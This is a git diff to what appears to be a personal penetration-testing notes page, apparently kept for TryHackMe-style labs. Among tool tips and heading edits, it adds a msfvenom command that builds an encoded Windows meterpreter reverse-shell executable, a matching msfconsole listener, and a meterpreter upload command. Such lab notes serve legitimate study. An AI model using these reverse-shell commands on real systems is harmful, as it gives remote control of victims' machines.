@@ -3,7 +3,7 @@ layout: single
 classes: #wide
 title: "General Info"
 sidebar:
-    title: "Pentest Info"
+    title: "General Info"
     nav: infosec
 collection: infopages
 permalink: /infosec/general/
@@ -73,14 +73,15 @@ One liner to download and execute winPEASany from memory in a PS shell
 
 ## Other
 Pspy - inspect application  
-`powershell -c` - allows for powershell command  
-winpeas & linpeas
+`powershell -c` - allows for powershell command    
+Exiftool - analyzing metadata
 
 
 ## Refrance links 
 tbd
 
-## Post exploitation
+## Post exploit
+Exiftool - analyzing meta data
 look for weird configs  
 linpeas.sh big
 
@@ -88,5 +89,13 @@ linpeas.sh big
 `sessions -i <session num>` - attach session   
 `sessions -u <session num>` - upgrade to meterpreter
 
+### Shells 
+ex msfvenom reverse shell:  
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`
+ex msfconsole listener:  
+`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`
+
 ### Meterpreter
 `channel -i <session>` - attaches
+`upload <file>` - uploads file
+
